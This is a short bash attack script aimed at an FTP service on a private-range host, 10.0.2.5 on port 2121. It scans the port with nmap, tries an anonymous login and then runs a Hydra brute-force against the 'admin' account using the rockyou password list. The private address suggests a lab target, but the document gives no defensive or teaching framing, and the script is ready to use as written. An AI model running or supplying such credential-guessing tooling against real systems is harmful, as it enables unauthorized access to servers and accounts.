
#!/bin/bash

# Define target IP and FTP port
TARGET_IP="10.0.2.5"
FTP_PORT="2121" 

# Step 1: Check if the FTP port is open
echo "[*] Checking if FTP port $FTP_PORT is open on $TARGET_IP ..."
nmap -p $FTP_PORT $TARGET_IP | grep "open"
if [ $? -ne 0 ]; then
  echo "[-] FTP port $FTP_PORT is closed on $TARGET_IP. Exiting."
  exit 1
fi

# Step 2: Anonymous login check
echo "[*] Checking for anonymous FTP login on $TARGET_IP ..."
ftp -inv $TARGET_IP $FTP_PORT << EOF | tee ftp_check.txt
user anonymous anonymous
EOF

if grep "230 Login successful" ftp_check.txt; then
  echo "[+] Anonymous login allowed on FTP server!"
else
  echo "[-] Anonymous login is not allowed."
fi

# Step 3: Attempt FTP brute-force attack with Hydra
echo "[*] Starting brute-force attack on FTP ..."
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://$TARGET_IP -t 4 -s $FTP_PORT

echo "[*] Script completed."
